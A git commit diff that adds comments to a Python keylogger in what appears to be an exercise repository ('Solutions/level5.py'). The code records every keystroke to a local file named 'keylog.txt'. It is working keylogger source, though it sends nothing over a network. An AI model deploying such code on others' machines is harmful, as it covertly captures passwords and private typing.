d846cce7ac0d745280ceb88d2a380581087a59c7
Orber Soares Bom Jesus <orbersoaresbomjesus@gmail.com>
2024-08-01 20:17:28 +0100

    main: Added comments to the keylogger

--- Solutions/level5.py
+++ Solutions/level5.py
@@ -6,15 +6,18 @@ log = ""
 
 # Define the on_press function to capture each keystroke
 def key_press(key):
-    global log
+    global log  # Access the global log variable
     try:
+        # Attempt to append the character representation of the key to the log
         log += str(key.char)
     except AttributeError:
+        # Handle special keys (e.g., space, enter, etc.) that don't have a char attribute
         if key == Key.space:
-            log += ' '
+            log += ' '  # Add a space character for the space key
         elif key == Key.enter:
-            log += '\n'
+            log += '\n'  # Add a newline character for the enter key
         else:
+            # Handle other special keys as needed (commented out)
             # log += ' ' + str(key) + ' '
             pass
 
@@ -25,9 +28,9 @@ def key_release(key):
         # Write the log to a file before exiting
         with open("keylog.txt", "w") as f:
             f.write(log)
-        return False
+        return False  # Returning False stops the listener
 
 
 # Set up the listener
 with Listener(on_press=key_press, on_release=key_release) as listener:
-    listener.join()
+    listener.join()  # Start the listener and wait for it to finish
